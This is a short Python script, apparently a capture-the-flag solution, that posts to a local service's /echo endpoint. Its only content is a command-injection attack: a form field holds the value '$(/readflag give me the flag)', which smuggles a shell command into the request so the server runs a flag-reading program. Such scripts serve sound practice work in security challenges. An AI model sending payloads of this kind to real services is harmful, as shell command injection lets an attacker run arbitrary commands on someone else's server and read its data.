import requests 

url = "http://localhost:59365"

r = requests.post(
    f"{url}/echo", 
    data={
        "msg": {"raw": "$(/readflag give me the flag)"}
    }
)

print(r.text) 


